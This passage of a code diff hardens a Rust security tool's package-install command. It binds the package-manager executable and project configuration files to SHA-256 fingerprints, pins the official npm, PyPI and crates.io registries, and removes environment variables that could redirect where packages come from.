@@ -20,11 +20,17 @@
 #[cfg(unix)]
 use tirith_core::runner::{self, RunOptions};
 
+use std::ffi::{OsStr, OsString};
+use std::path::{Path, PathBuf};
 use std::process::Command;
+
+use sha2::{Digest as _, Sha256};
 
 use tirith_core::engine::{self, AnalysisContext};
 use tirith_core::extract::ScanContext;
-use tirith_core::install_txn::{self, InstallPlan, OnlineMode, PackageManager, PlanRequest};
+use tirith_core::install_txn::{
+    self, InstallArgv, InstallCoverageGap, InstallPlan, OnlineMode, PackageManager, PlanRequest,
+};
 use tirith_core::policy::Policy;
 use tirith_core::registry_api::{self, HttpRegistryClient};
 use tirith_core::style::Stream;
@@ -118,23 +124,42 @@ pub trait InstallRunner {
     ) -> std::io::Result<InstallRunOutput>;
 }
 
-/// Production [`InstallRunner`] — spawns the real package manager.
-pub struct ProcessInstallRunner;
+/// Production [`InstallRunner`] — spawns only the package manager identity that
+/// was resolved before analysis and approved by the operator.
+pub struct ProcessInstallRunner<'a> {
+    executable: &'a InstallExecutableBinding,
+    source_binding: &'a InstallSourceBinding,
+}
 
-impl InstallRunner for ProcessInstallRunner {
+impl InstallRunner for ProcessInstallRunner<'_> {
     fn run(
         &self,
         program: &str,
         args: &[String],
         capture: bool,
     ) -> std::io::Result<InstallRunOutput> {
-        // Direct spawn — `program` is a fixed name and `args` go through argv,
-        // so there is no shell and no word-splitting.
+        // Revalidate the selected invocation path, its canonical target, and
+        // the target's content digest immediately before spawn. `program` must
+        // be the absolute path stored in the approved plan; PATH is never
+        // consulted for the primary executable. Executing the selected path
+        // preserves multicall argv[0] semantics such as `cargo -> rustup`.
+        let mut command = Command::new(self.executable.path());
+        command.args(args);
+        self.source_binding.configure_command(&mut command);
+        if let Some(path) = tirith_core::trusted_child::sanitized_ambient_path() {
+            // Keep project/tmp candidates out of `#!/usr/bin/env ...`
+            // interpreter resolution and helper-child lookup as well.
+            command.env("PATH", path);
+        }
+        // Keep both identity checks as close to the actual spawn as the
+        // process API permits, after all command configuration is complete.
+        self.executable.verify_program(program)?;
+        self.source_binding.verify()?;
         if capture {
             // PR #121 fix-list item 3 — capture mode for `--format json` buffers
             // child stdout/stderr so they don't interleave between JSON objects
             // (which previously made the output unparseable).
-            let output = Command::new(program).args(args).output()?;
+            let output = command.output()?;
             Ok(InstallRunOutput {
                 exit_code: output.status.code(),
                 stdout: Some(String::from_utf8_lossy(&output.stdout).into_owned()),
@@ -142,7 +167,7 @@ impl InstallRunner for ProcessInstallRunner {
             })
         } else {
             // Streaming (human) mode — child stdio inherits the terminal.
-            let status = Command::new(program).args(args).status()?;
+            let status = command.status()?;
             Ok(InstallRunOutput {
                 exit_code: status.code(),
                 stdout: None,
@@ -150,6 +175,709 @@ impl InstallRunner for ProcessInstallRunner {
             })
         }
     }
+}
+
+const MAX_INSTALL_EXECUTABLE_BYTES: u64 = 512 * 1024 * 1024;
+const MAX_SOURCE_CONFIG_BYTES: u64 = 1024 * 1024;
+
+/// Identity approved for one package-manager transaction. A later PATH change
+/// cannot redirect execution, and replacement at the same path is rejected.
+#[derive(Debug, Clone)]
+struct InstallExecutableBinding {
+    invocation_path: PathBuf,
+    canonical_path: PathBuf,
+    sha256: [u8; 32],
+}
+
+impl InstallExecutableBinding {
+    fn resolve(program: &str) -> std::io::Result<Self> {
+        let trusted =
+            tirith_core::trusted_child::resolve_ambient(program).map_err(std::io::Error::other)?;
+        Self::from_trusted(trusted)
+    }
+
+    fn from_trusted(
+        trusted: tirith_core::trusted_child::TrustedExecutable,
+    ) -> std::io::Result<Self> {
+        let invocation_path = trusted.invocation_path().to_path_buf();
+        let canonical_path = trusted.path().to_path_buf();
+        let sha256 = hash_install_executable(&canonical_path)?;
+        Ok(Self {
+            invocation_path,
+            canonical_path,
+            sha256,
+        })
+    }
+
+    fn path(&self) -> &Path {
+        &self.invocation_path
+    }
+
+    fn sha256_hex(&self) -> String {
+        self.sha256
+            .iter()
+            .map(|byte| format!("{byte:02x}"))
+            .collect()
+    }
+
+    fn verify_program(&self, program: &str) -> std::io::Result<()> {
+        self.verify_program_with_denied(
+            program,
+            &tirith_core::trusted_child::ambient_denied_roots(),
+        )
+    }
+
+    fn verify_program_with_denied(
+        &self,
+        program: &str,
+        denied_roots: &[PathBuf],
+    ) -> std::io::Result<()> {
+        let requested = Path::new(program);
+        if !requested.is_absolute() || requested != self.invocation_path {
+            return Err(std::io::Error::other(
+                "approved install executable path does not match the spawn path",
+            ));
+        }
+        let trusted =
+            tirith_core::trusted_child::TrustedExecutable::from_absolute(requested, denied_roots)
+                .map_err(std::io::Error::other)?;
+        if trusted.invocation_path() != self.invocation_path
+            || trusted.path() != self.canonical_path
+        {
+            return Err(std::io::Error::other(
+                "approved install executable now resolves to a different path",
+            ));
+        }
+        if hash_install_executable(trusted.path())? != self.sha256 {
+            return Err(std::io::Error::other(
+                "approved install executable changed after analysis",
+            ));
+        }
+        Ok(())
+    }
+}
+
+fn hash_install_executable(path: &Path) -> std::io::Result<[u8; 32]> {
+    use std::io::Read as _;
+
+    let metadata = std::fs::metadata(path)?;
+    if !metadata.is_file() {
+        return Err(std::io::Error::other(
+            "install executable is not a regular file",
+        ));
+    }
+    if metadata.len() > MAX_INSTALL_EXECUTABLE_BYTES {
+        return Err(std::io::Error::other(format!(
+            "install executable exceeds the {MAX_INSTALL_EXECUTABLE_BYTES} byte identity limit"
+        )));
+    }
+    let mut file = std::fs::File::open(path)?;
+    let mut hasher = Sha256::new();
+    let mut buffer = [0_u8; 64 * 1024];
+    loop {
+        let count = file.read(&mut buffer)?;
+        if count == 0 {
+            break;
+        }
+        hasher.update(&buffer[..count]);
+    }
+    Ok(hasher.finalize().into())
+}
+
+#[derive(Debug)]
+enum CapturedSourceConfigState {
+    Missing,
+    Present {
+        canonical_path: PathBuf,
+        sha256: [u8; 32],
+    },
+}
+
+#[derive(Debug)]
+struct CapturedSourceConfig {
+    requested_path: PathBuf,
+    state: CapturedSourceConfigState,
+}
+
+impl CapturedSourceConfig {
+    fn capture(path: PathBuf) -> std::io::Result<(Self, Option<String>)> {
+        let metadata = match std::fs::symlink_metadata(&path) {
+            Ok(metadata) => metadata,
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+                return Ok((
+                    Self {
+                        requested_path: path,
+                        state: CapturedSourceConfigState::Missing,
+                    },
+                    None,
+                ));
+            }
+            Err(error) => return Err(error),
+        };
+        if !metadata.file_type().is_file() && !metadata.file_type().is_symlink() {
+            return Err(std::io::Error::other(format!(
+                "source configuration {} is not a regular file",
+                path.display()
+            )));
+        }
+        let canonical_path = path.canonicalize()?;
+        let (sha256, content) = hash_and_read_source_config(&canonical_path)?;
+        Ok((
+            Self {
+                requested_path: path,
+                state: CapturedSourceConfigState::Present {
+                    canonical_path,
+                    sha256,
+                },
+            },
+            Some(content),
+        ))
+    }
+
+    fn verify(&self) -> std::io::Result<()> {
+        match &self.state {
+            CapturedSourceConfigState::Missing => {
+                match std::fs::symlink_metadata(&self.requested_path) {
+                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
+                    Ok(_) => Err(std::io::Error::other(format!(
+                        "source configuration {} appeared after analysis",
+                        self.requested_path.display()
+                    ))),
+                    Err(error) => Err(error),
+                }
+            }
+            CapturedSourceConfigState::Present {
+                canonical_path,
+                sha256,
+            } => {
+                let current_canonical = self.requested_path.canonicalize()?;
+                if &current_canonical != canonical_path {
+                    return Err(std::io::Error::other(format!(
+                        "source configuration {} now resolves to a different file",
+                        self.requested_path.display()
+                    )));
+                }
+                let (current_sha256, _) = hash_and_read_source_config(&current_canonical)?;
+                if &current_sha256 != sha256 {
+                    return Err(std::io::Error::other(format!(
+                        "source configuration {} changed after analysis",
+                        self.requested_path.display()
+                    )));
+                }
+                Ok(())
+            }
+        }
+    }
+}
+
+fn hash_and_read_source_config(path: &Path) -> std::io::Result<([u8; 32], String)> {
+    use std::io::Read as _;
+
+    let metadata = std::fs::metadata(path)?;
+    if !metadata.is_file() || metadata.len() > MAX_SOURCE_CONFIG_BYTES {
+        return Err(std::io::Error::other(format!(
+            "source configuration {} is not a bounded regular file",
+            path.display()
+        )));
+    }
+    let file = std::fs::File::open(path)?;
+    let mut bytes = Vec::with_capacity(metadata.len() as usize);
+    file.take(MAX_SOURCE_CONFIG_BYTES.saturating_add(1))
+        .read_to_end(&mut bytes)?;
+    if bytes.len() as u64 > MAX_SOURCE_CONFIG_BYTES {
+        return Err(std::io::Error::other(format!(
+            "source configuration {} exceeds the {} byte limit",
+            path.display(),
+            MAX_SOURCE_CONFIG_BYTES
+        )));
+    }
+    let content = String::from_utf8(bytes.clone()).map_err(|_| {
+        std::io::Error::other(format!(
+            "source configuration {} is not UTF-8",
+            path.display()
+        ))
+    })?;
+    Ok((Sha256::digest(&bytes).into(), content))
+}
+
+/// Source-selection state approved together with one install plan. npm and pip
+/// receive explicit official-registry configuration and disposable caches;
+/// cargo registry installs additionally run outside the project configuration
+/// tree. Project config paths that can still affect npm/cargo are fingerprinted
+/// (including absence) and revalidated immediately before spawn.
+#[derive(Debug)]
+struct InstallSourceBinding {
+    manager: PackageManager,
+    source_configs: Vec<CapturedSourceConfig>,
+    isolated: Option<tempfile::TempDir>,
+    configuration_issue: Option<String>,
+    npm_project_manifest_gap: Option<InstallCoverageGap>,
+    npm_scopes: Vec<String>,
+    cargo_isolated_cwd: bool,
+    cargo_install_root: Option<OsString>,
+}
+
+impl InstallSourceBinding {
+    fn capture(
+        manager: PackageManager,
+        cwd: Option<&Path>,
+        args: &[String],
+    ) -> std::io::Result<Self> {
+        let mut candidate_paths = match manager {
+            PackageManager::Npm => {
+                let mut paths = configuration_candidates(cwd, Path::new(".npmrc"));
+                paths.extend(configuration_candidates(cwd, Path::new("package.json")));
+                for prefix in npm_prefix_roots(args, cwd) {
+                    paths.extend(configuration_candidates_for_path(
+                        &prefix,
+                        Path::new(".npmrc"),
+                    ));
+                    paths.extend(configuration_candidates_for_path(
+                        &prefix,
+                        Path::new("package.json"),
+                    ));
+                }
+                paths
+            }
+            PackageManager::Cargo => {
+                let mut paths = configuration_candidates(cwd, Path::new(".cargo/config.toml"));
+                paths.extend(configuration_candidates(cwd, Path::new(".cargo/config")));
+                paths
+            }
+            _ => Vec::new(),
+        };
+        candidate_paths.sort();
+        candidate_paths.dedup();
+
+        let mut source_configs = Vec::with_capacity(candidate_paths.len().saturating_add(3));
+        let mut configuration_issue = None;
+        let mut npm_project_manifest_gap = None;
+        let mut npm_scopes = Vec::new();
+        for path in candidate_paths {
+            let path_label = path.display().to_string();
+            let is_npm_config =
+                manager == PackageManager::Npm && path.file_name() == Some(OsStr::new(".npmrc"));
+            let is_npm_manifest = manager == PackageManager::Npm
+                && path.file_name() == Some(OsStr::new("package.json"));
+            let (snapshot, content) = CapturedSourceConfig::capture(path)?;
+            if configuration_issue.is_none() {
+                configuration_issue = content
+                    .as_deref()
+                    .and_then(|content| match manager {
+                        PackageManager::Npm if is_npm_config => npm_config_source_issue(content),
+                        PackageManager::Cargo => cargo_config_source_issue(content),
+                        _ => None,
+                    })
+                    .map(|reason| format!("{path_label}: {reason}"));
+            }
+            if is_npm_config {
+                if let Some(content) = content.as_deref() {
+                    npm_scopes.extend(npm_registry_scopes(content));
+                }
+            }
+            if npm_project_manifest_gap.is_none() && is_npm_manifest {
+                if let Some(content) = content.as_deref() {
+                    npm_project_manifest_gap =
+                        install_txn::captured_npm_project_manifest_coverage_gap(
+                            &snapshot.requested_path,
+                            content,
+                            args,
+                        );
+                }
+            }
+            source_configs.push(snapshot);
+        }
+
+        let isolated = match manager {
+            PackageManager::Npm | PackageManager::Cargo => {
+                let directory = tempfile::Builder::new()
+                    .prefix("tirith-install-source-")
+                    .tempdir()?;
+                if manager == PackageManager::Npm {
+                    std::fs::write(
+                        directory.path().join("npm-user.npmrc"),
+                        "registry=https://registry.npmjs.org/\npackage-lock=false\n",
+                    )?;
+                    std::fs::write(
+                        directory.path().join("npm-global.npmrc"),
+                        "registry=https://registry.npmjs.org/\n",
+                    )?;
+                    // These disposable files are source-affecting inputs too.
+                    // Bind their identity so a same-user replacement between
+                    // analysis and spawn is rejected like project config drift.
+                    for name in ["npm-user.npmrc", "npm-global.npmrc"] {
+                        let (snapshot, _) =
+                            CapturedSourceConfig::capture(directory.path().join(name))?;
+                        source_configs.push(snapshot);
+                    }
+                } else {
+                    std::fs::create_dir(directory.path().join("cargo-home"))?;
+                    std::fs::create_dir(directory.path().join("cargo-work"))?;
+                }
+                Some(directory)
+            }
+            _ => None,
+        };
+
+        npm_scopes.extend(args.iter().filter_map(|argument| {
+            let slash = argument.strip_prefix('@')?.find('/')?;
+            let scope = &argument[..slash.saturating_add(1)];
+            (!scope.is_empty()).then(|| scope.to_ascii_lowercase())
+        }));
+        npm_scopes.sort();
+        npm_scopes.dedup();
+
+        let cargo_isolated_cwd =
+            manager == PackageManager::Cargo && !cargo_args_require_original_cwd(args);
+        let cargo_install_root = if manager == PackageManager::Cargo {
+            cargo_install_root(cwd)
+        } else {
+            None
+        };
+
+        Ok(Self {
+            manager,
+            source_configs,
+            isolated,
+            configuration_issue,
+            npm_project_manifest_gap,
+            npm_scopes,
+            cargo_isolated_cwd,
+            cargo_install_root,
+        })
+    }
+
+    fn configuration_issue(&self) -> Option<&str> {
+        self.configuration_issue.as_deref()
+    }
+
+    fn npm_project_manifest_gap(&self) -> Option<&InstallCoverageGap> {
+        self.npm_project_manifest_gap.as_ref()
+    }
+
+    fn verify(&self) -> std::io::Result<()> {
+        for config in &self.source_configs {
+            config.verify()?;
+        }
+        Ok(())
+    }
+
+    fn configure_command(&self, command: &mut Command) {
+        if matches!(
+            self.manager,
+            PackageManager::Npm | PackageManager::Pip | PackageManager::Cargo
+        ) {
+            remove_matching_environment(command, is_transport_override_environment);
+        }
+        match self.manager {
+            PackageManager::Npm => {
+                let isolated = self
+                    .isolated
+                    .as_ref()
+                    .expect("npm source binding must own disposable configuration");
+                remove_matching_environment(command, is_npm_runtime_override_environment);
+                command
+                    .env("NPM_CONFIG_REGISTRY", "https://registry.npmjs.org/")
+                    .env(
+                        "NPM_CONFIG_USERCONFIG",
+                        isolated.path().join("npm-user.npmrc"),
+                    )
+                    .env(
+                        "NPM_CONFIG_GLOBALCONFIG",
+                        isolated.path().join("npm-global.npmrc"),
+                    )
+                    .env("NPM_CONFIG_CACHE", isolated.path().join("npm-cache"))
+                    .env("NPM_CONFIG_PACKAGE_LOCK", "false")
+                    .env("NPM_CONFIG_SHRINKWRAP", "false")
+                    .env("NPM_CONFIG_OFFLINE", "false")
+                    .env("NPM_CONFIG_PREFER_ONLINE", "true");
+                for scope in &self.npm_scopes {
+                    command.env(
+                        format!("npm_config_{scope}:registry"),
+                        "https://registry.npmjs.org/",
+                    );
+                }
+            }
+            PackageManager::Pip => {
+                remove_matching_environment(command, |name| {
+                    os_name_starts_with_ignore_ascii_case(name, "pip_")
+                });
+                command
+                    // pip treats PIP_CONFIG_FILE=os.devnull as an explicit
+                    // request to skip global, user, and site configuration.
+                    // This prevents additive settings such as
+                    // extra-index-url from surviving beneath our official
+                    // index environment binding.
+                    .env("PIP_CONFIG_FILE", null_device_path())
+                    .env("PIP_INDEX_URL", "https://pypi.org/simple")
+                    .env("PIP_NO_INDEX", "false")
+                    .env("PIP_NO_CACHE_DIR", "true")
+                    .env("PIP_DISABLE_PIP_VERSION_CHECK", "true");
+            }
+            PackageManager::Cargo => {
+                let isolated = self
+                    .isolated
+                    .as_ref()
+                    .expect("cargo source binding must own a disposable home");
+                scrub_cargo_runtime_environment(command);
+                remove_matching_environment(command, |name| {
+                    os_name_starts_with_ignore_ascii_case(name, "cargo_registry_")
+                        || os_name_starts_with_ignore_ascii_case(name, "cargo_registries_")
+                        || os_name_starts_with_ignore_ascii_case(name, "cargo_source_")
+                        || os_name_eq_ignore_ascii_case(name, "cargo_home")
+                });
+                command
+                    .env("CARGO_HOME", isolated.path().join("cargo-home"))
+                    .env("CARGO_REGISTRY_DEFAULT", "crates-io")
+                    .env(
+                        "CARGO_REGISTRIES_CRATES_IO_INDEX",
+                        "sparse+https://index.crates.io/",
+                    );
+                if let Some(root) = &self.cargo_install_root {
+                    command.env("CARGO_INSTALL_ROOT", root);
+                }
+                if self.cargo_isolated_cwd {
+                    command.current_dir(isolated.path().join("cargo-work"));
+                }
+            }
+            _ => {}
+        }
+    }
+}
+
+fn remove_matching_environment(command: &mut Command, predicate: impl Fn(&OsStr) -> bool) {
+    let explicit_names = command
+        .get_envs()
+        .filter_map(|(name, _)| predicate(name).then_some(name.to_os_string()))
+        .collect::<Vec<_>>();
+    for name in explicit_names {
+        command.env_remove(name);
+    }
+    for (name, _) in std::env::vars_os() {
+        if predicate(&name) {
+            command.env_remove(name);
+        }
+    }
+}
+
+fn scrub_cargo_runtime_environment(command: &mut Command) {
+    const EXACT_OVERRIDES: &[&str] = &[
+        "RUSTC",
+        "RUSTDOC",
+        "RUSTC_WRAPPER",
+        "RUSTC_WORKSPACE_WRAPPER",
+        "RUSTFLAGS",
+        "RUSTDOCFLAGS",
+        "CARGO_ENCODED_RUSTFLAGS",
+        "CARGO_ENCODED_RUSTDOCFLAGS",
+    ];
+
+    // Record deterministic removals even when a variable is absent from this
+    // process. Lowercase spellings matter on case-insensitive platforms and
+    // also make the intended boundary explicit in command-level tests.
+    for name in EXACT_OVERRIDES {
+        command.env_remove(name);
+        command.env_remove(name.to_ascii_lowercase());
+    }
+    remove_matching_environment(command, is_cargo_runtime_override_environment);
+}
+
+fn os_name_starts_with_ignore_ascii_case(name: &OsStr, prefix: &str) -> bool {
+    name.to_str()
+        .and_then(|name| name.get(..prefix.len()))
+        .is_some_and(|head| head.eq_ignore_ascii_case(prefix))
+}
+
+fn os_name_eq_ignore_ascii_case(name: &OsStr, expected: &str) -> bool {
+    name.to_str()
+        .is_some_and(|name| name.eq_ignore_ascii_case(expected))
+}
+
+fn is_npm_runtime_override_environment(name: &OsStr) -> bool {
+    os_name_starts_with_ignore_ascii_case(name, "npm_config_")
+        || os_name_eq_ignore_ascii_case(name, "node_options")
+        || os_name_eq_ignore_ascii_case(name, "node_path")
+}
+
+fn is_cargo_runtime_override_environment(name: &OsStr) -> bool {
+    let Some(name) = name.to_str() else {
+        return false;
+    };
+    let upper = name.to_ascii_uppercase();
+    upper.starts_with("CARGO_BUILD_")
+        || upper.starts_with("CARGO_TARGET_")
+        || upper.starts_with("RUSTUP_")
+        || matches!(
+            upper.as_str(),
+            "RUSTC"
+                | "RUSTDOC"
+                | "RUSTC_WRAPPER"
+                | "RUSTC_WORKSPACE_WRAPPER"
+                | "RUSTFLAGS"
+                | "RUSTDOCFLAGS"
+                | "CARGO_ENCODED_RUSTFLAGS"
+                | "CARGO_ENCODED_RUSTDOCFLAGS"
+        )
+}
+
+fn is_transport_override_environment(name: &OsStr) -> bool {
+    let Some(name) = name.to_str() else {
+        return false;
+    };
+    let upper = name.to_ascii_uppercase();
+    upper.starts_with("CARGO_HTTP_")
+        || matches!(
+            upper.as_str(),
+            "HTTP_PROXY"
+                | "HTTPS_PROXY"
+                | "ALL_PROXY"
+                | "NO_PROXY"
+                | "SSL_CERT_FILE"
+                | "SSL_CERT_DIR"
+                | "REQUESTS_CA_BUNDLE"
+                | "CURL_CA_BUNDLE"
+                | "NODE_EXTRA_CA_CERTS"
+                | "NODE_TLS_REJECT_UNAUTHORIZED"
+        )
+}
+
+fn null_device_path() -> &'static str {
+    if cfg!(windows) {
+        // pip compares PIP_CONFIG_FILE byte-for-byte with Python's
+        // `os.devnull` sentinel before deciding to skip every config file.
+        // CPython reports lowercase `nul` on Windows; `NUL` opens the same
+        // device but does not trigger pip's case-sensitive sentinel branch.
+        "nul"
+    } else {
+        "/dev/null"
+    }
+}
+
+fn npm_registry_scopes(content: &str) -> Vec<String> {
+    content
+        .strip_prefix('\u{feff}')
+        .unwrap_or(content)
+        .lines()
+        .filter_map(|line| {
+            let line = line.trim();
+            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+                return None;
+            }
+            let (key, _) = line.split_once('=')?;
+            let key = npm_ini_normalize_key(key);
+            let scope = key.strip_suffix(":registry")?.to_string();
+            (scope.starts_with('@') && scope.len() > 1).then_some(scope)
+        })
+        .collect()
+}
+
+fn npm_prefix_roots(args: &[String], cwd: Option<&Path>) -> Vec<PathBuf> {
+    let base = cwd
+        .map(Path::to_path_buf)
+        .or_else(|| std::env::current_dir().ok());
+    let mut roots = Vec::new();
+    let mut index = 0;
+    while index < args.len() {
+        let value = if args[index] == "--prefix" {
+            index = index.saturating_add(1);
+            args.get(index).map(String::as_str)
+        } else {
+            args[index].strip_prefix("--prefix=")
+        };
+        if let Some(value) = value.filter(|value| !value.is_empty()) {
+            let path = PathBuf::from(value);
+            roots.push(if path.is_absolute() {
+                path
+            } else if let Some(base) = &base {
+                base.join(path)
+            } else {
+                path
+            });
+        }
+        index = index.saturating_add(1);
+    }
+    roots
+}
+
+fn cargo_args_require_original_cwd(args: &[String]) -> bool {
+    // Relative output-only paths are absolutized before this decision, so they
+    // do not need access to project configuration. Only input-bearing forms
+    // retain cwd, and both are explicit coverage gaps in the core planner.
+    const PATH_FLAGS: &[&str] = &["--path", "--config"];
+    args.iter().any(|argument| {
+        PATH_FLAGS.contains(&argument.as_str())
+            || PATH_FLAGS
+                .iter()
+                .any(|flag| argument.starts_with(&format!("{flag}=")))
+    })
+}
+
+fn bind_cargo_output_paths(args: &[String], cwd: &Path) -> Result<Vec<String>, String> {
+    const OUTPUT_FLAGS: &[&str] = &["--root", "--target-dir"];
+
+    let mut bound = Vec::with_capacity(args.len());
+    let mut index = 0;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            bound.extend(args[index..].iter().cloned());
+            break;
+        }
+        if OUTPUT_FLAGS.contains(&argument.as_str()) {
+            bound.push(argument.clone());
+            if let Some(value) = args.get(index.saturating_add(1)) {
+                bound.push(bind_cargo_output_path_value(argument, value, cwd)?);
+                index = index.saturating_add(2);
+            } else {
+                // Preserve the missing value so the core coverage parser emits
+                // its typed MissingArgumentValue gap.
+                index = index.saturating_add(1);
+            }
+            continue;
+        }
+        if let Some((flag, value)) = argument.split_once('=') {
+            if OUTPUT_FLAGS.contains(&flag) {
+                let value = bind_cargo_output_path_value(flag, value, cwd)?;
+                bound.push(format!("{flag}={value}"));
+                index = index.saturating_add(1);
+                continue;
+            }
+        }
+        bound.push(argument.clone());
+        index = index.saturating_add(1);
+    }
+    Ok(bound)
+}
+
+fn bind_cargo_output_path_value(flag: &str, value: &str, cwd: &Path) -> Result<String, String> {
+    if value.is_empty() {
+        return Ok(String::new());
+    }
+    let value_path = Path::new(value);
+    let bound = if value_path.is_absolute() {
+        value_path.to_path_buf()
+    } else {
+        cwd.join(value_path)
+    };
+    bound.into_os_string().into_string().map_err(|_| {
+        format!(
+            "{flag} cannot be safely bound to the current directory because the absolute path is not valid UTF-8"
+        )
+    })
+}
+
+fn cargo_install_root(cwd: Option<&Path>) -> Option<OsString> {
+    let configured = std::env::var_os("CARGO_INSTALL_ROOT")
+        .or_else(|| std::env::var_os("CARGO_HOME"))
+        .or_else(|| home::home_dir().map(|home| home.join(".cargo").into_os_string()))?;
+    let path = PathBuf::from(&configured);
+    if path.is_absolute() {
+        return Some(configured);
+    }
+    let base = cwd
+        .map(Path::to_path_buf)
+        .or_else(|| std::env::current_dir().ok())?;
+    Some(base.join(path).into_os_string())
 }
 
 /// Entry point for `tirith install`. `source` selects the install kind; `args`
@@ -216,22 +944,88 @@ fn run_package_manager(
         return 2;
     }
 
+    // Select and fingerprint the executable before any approval is produced.
+    // `--no-exec` remains a portable analysis-only operation and therefore
+    // does not require the package manager to be installed on this host.
+    let executable_binding = if no_exec
+        || (manager.is_windows_only_runtime() && !cfg!(target_os = "windows"))
+    {
+        None
+    } else {
+        match InstallExecutableBinding::resolve(manager.program()) {
+            Ok(binding) => Some(binding),
+            Err(error) => {
+                eprintln!(
+                    "tirith install: refusing to analyze-and-run an untrusted or unresolved '{}' executable: {}",
+                    manager.program(),
+                    install_value_for_human(&error.to_string()),
+                );
+                return 2;
+            }
+        }
+    };
+
     let interactive = is_terminal::is_terminal(std::io::stderr());
-    let cwd = std::env::current_dir()
-        .ok()
-        .map(|p| p.display().to_string());
+    let cwd_path = match std::env::current_dir() {
+        Ok(path) => path,
+        Err(error) => {
+            eprintln!(
+                "tirith install: refusing to continue without a stable current directory for source and manifest coverage: {}",
+                install_value_for_human(&error.to_string()),
+            );
+            return 2;
+        }
+    };
+    // Keep the OS-native path for every security-sensitive source/config and
+    // manifest lookup. The display string is only for policy/engine output;
+    // lossy UTF-8 conversion must never select what npm bytes are inspected.
+    let cwd = Some(cwd_path.display().to_string());
+    let effective_args = if manager == PackageManager::Cargo {
+        match bind_cargo_output_paths(args, &cwd_path) {
+            Ok(args) => args,
+            Err(error) => {
+                eprintln!(
+                    "tirith install: refusing to continue without stable Cargo output paths: {}",
+                    install_value_for_human(&error.to_string()),
+                );
+                return 2;
+            }
+        }
+    } else {
+        args.to_vec()
+    };
+    let args = effective_args.as_slice();
     let policy = Policy::discover(cwd.as_deref());
+    let source_binding = match InstallSourceBinding::capture(manager, Some(&cwd_path), args) {
+        Ok(binding) => binding,
+        Err(error) => {
+            eprintln!(
+                "tirith install: refusing to analyze-and-run without a stable {} source configuration: {}",
+                manager.label(),
+                install_value_for_human(&error.to_string()),
+            );
+            return 2;
+        }
+    };
 
     // --- ANALYZE ---
     // Offline by default; `--online` opts in, `--offline` / `TIRITH_OFFLINE`
     // overrides it. The resolver degrades any registry failure to `Unavailable`.
     let use_online = online && !offline && !super::offline_env_active();
     let http_client = HttpRegistryClient::new();
+    // Source ambiguity is a transaction property, not an online-resolver
+    // property. Detect it even for the default offline analysis so strict
+    // policy never mistakes ambient/custom bytes for official provenance.
+    let registry_configuration_issue = source_binding
+        .configuration_issue()
+        .map(str::to_owned)
+        .or_else(|| detect_registry_configuration_issue(manager, Some(&cwd_path)));
     // M6 ch6 — fold `PackageExistence` into the provenance so the
     // `PackageNotFoundInRegistry` gate can read it; an `Unavailable` with a
     // positive 404 is upgraded to `Available` carrying only existence.
-    let resolver = |eco: Ecosystem, name: &str| {
-        let (mut signals, existence) = registry_api::gather_api_signals(&http_client, eco, name);
+    let resolver = |eco: Ecosystem, name: &str, version: &str| {
+        let (mut signals, existence) =
+            registry_api::gather_api_signals_exact(&http_client, eco, name, version);
         use tirith_core::package_risk::{ApiProvenance, PackageExistence};
         match &mut signals {
             tirith_core::package_risk::ApiSignals::Available { provenance } => {
@@ -246,6 +1040,7 @@ fn run_package_manager(
             {
                 let mut prov = ApiProvenance {
                     source: eco.to_string(),
+                    package_name: Some(name.to_string()),
                     package_existence: PackageExistence::NotFound,
                     ..Default::default()
                 };
@@ -259,10 +1054,12 @@ fn run_package_manager(
         }
         signals
     };
-    let online_mode = if use_online {
-        OnlineMode::Resolver(&resolver)
-    } else {
+    let online_mode = if let Some(reason) = registry_configuration_issue.as_deref() {
+        OnlineMode::UnverifiedSource(reason)
+    } else if !use_online {
         OnlineMode::Off
+    } else {
+        OnlineMode::Resolver(&resolver)
     };
 
     let db = ThreatDb::cached();
@@ -275,7 +1072,28 @@ fn run_package_manager(
         interactive,
         online: online_mode,
     };
-    let mut plan = install_txn::plan_install(&plan_request);
+    let mut plan = install_txn::plan_install_with_captured_npm_manifest(
+        &plan_request,
+        source_binding.npm_project_manifest_gap(),
+    );
+    if let Some(binding) = &executable_binding {
+        plan.argv.program = binding.path().display().to_string();
+        plan.analysis_command = plan.argv.display();
+        plan.notes.push(format!(
+            "package-manager executable bound to {} (sha256={})",
+            binding.path().display(),
+            binding.sha256_hex(),
+        ));
+    }
+    if matches!(
+        manager,
+        PackageManager::Npm | PackageManager::Pip | PackageManager::Cargo
+    ) {
+        plan.notes.push(format!(
+            "{} ambient source state bound to sanitized official-registry settings; explicit source-changing arguments remain coverage-gated and relevant project configuration is fingerprinted until spawn",
+            manager.label()
+        ));
+    }
 
     // M4 item 8 chunk 3 — stamp the caller origin before the audit write (the
     // engine doesn't know the caller's identity; the CLI does), else audit lines
@@ -306,7 +1124,7 @@ fn run_package_manager(
         if !json {
             eprintln!(
                 "tirith install: --no-exec — analysis only, '{}' was NOT run.",
-                plan.analysis_command
+                install_command_for_human(&plan.argv),
             );
         }
         match plan.verdict.action {
@@ -335,7 +1153,10 @@ fn run_package_manager(
         &policy.dlp_custom_patterns,
     ) {
         if !json {
-            eprintln!("tirith install: audit log not written (non-fatal): {e}");
+            eprintln!(
+                "tirith install: audit log not written (non-fatal): {}",
+                install_value_for_human(&e.to_string()),
+            );
         }
     }
 
@@ -358,7 +1179,7 @@ fn run_package_manager(
                         "tirith install: refusing to run '{}' — {} is Windows-only \
                          at the real-run step. Use `--no-exec` to analyze on this OS, \
                          or run the command from a Windows host.",
-                        plan.analysis_command,
+                        install_command_for_human(&plan.argv),
                         plan.manager.label(),
                     );
                 } else {
@@ -380,15 +1201,473 @@ fn run_package_manager(
                 }
                 return 2;
             }
-            run_and_record(
-                &plan,
-                cwd.as_deref(),
-                json,
-                use_online,
-                &ProcessInstallRunner,
-            )
+            let Some(executable) = executable_binding.as_ref() else {
+                eprintln!(
+                    "tirith install: internal error: approved executable identity is unavailable"
+                );
+                return 2;
+            };
+            let runner = ProcessInstallRunner {
+                executable,
+                source_binding: &source_binding,
+            };
+            run_and_record(&plan, cwd.as_deref(), json, use_online, &runner)
         }
     }
+}
+
+/// Inspect source-selection environment and configuration before registry
+/// scoring. Explicit CLI source flags are handled token-by-token in
+/// `install_txn`; this catches the ambient/project configuration that the real
+/// manager will also consume. Any ambiguous or custom source suppresses
